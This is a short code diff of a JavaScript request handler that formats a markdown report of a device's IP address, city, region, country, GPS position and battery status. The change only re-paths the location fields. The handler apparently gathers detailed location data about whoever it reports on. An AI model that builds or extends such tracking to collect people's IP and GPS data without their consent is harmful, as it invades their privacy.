@@ -28,9 +28,9 @@ export default async (req, res) => {
 
     `📍 **Location & IP:**\n` +
     `- IP: ${d.ip}\n` +
-    `- City: ${d.city}\n` +
-    `- Region: ${d.region}\n` +
-    `- Country: ${d.country}\n` +
+    `- City: ${d.location.city}\n` +
+    `- Region: ${d.location.region}\n` +
+    `- Country: ${d.location.country}\n` +
     `- GPS: ${d.gps}\n\n` +
 
     `🔋 **Battery:**\n` +
